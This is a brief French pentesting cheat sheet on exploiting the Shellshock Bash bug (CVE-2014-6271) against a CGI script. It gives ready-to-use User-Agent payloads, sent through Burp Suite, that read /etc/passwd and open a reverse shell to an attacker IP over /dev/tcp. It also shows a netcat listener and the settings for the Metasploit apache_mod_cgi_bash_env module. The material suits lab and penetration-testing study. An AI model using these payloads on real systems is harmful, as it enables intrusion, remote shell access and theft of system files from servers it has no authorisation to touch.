
# Shellshock
Shellshock (CVE-2014-6271 et suivantes) est un bug dans Bash (le shell Unix/Linux).  

Un site Web qui utilise un script "CGI" comme un compte à rebours par exemple dynamique sur un site web. 

Avec le proxy "Burp Suite" on peut intégrer du code pour exploiter cette vuln, dans User-agent :
`() { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'` dans le repeater et "send", on doit récupérer la list des passwd.  
Pour obtenir un shell, on se met en écoute sur la machine d'attaque :  
`nc -nvlp 1234`

Puis dans le repeater de Burp Suite :  
`User-Agent: () { :; }; echo; echo; /bin/bash -c 'bash -i>&/dev/tcp/192.151.9.2/1234 0>&1'` et on obtient un shell  

#### :bulb: Avec Metasploit et le ``module auxiliary(scanner/http/apache_mod_cgi_bash_env``  
(Désactiver le proxy)
Rentrer la cible avec RHOSTS, notre machine d'attaque avec son IP (et pas la loopback!), "puis TARGETURI /gettime.cgi", puis exploit...  

# FTP

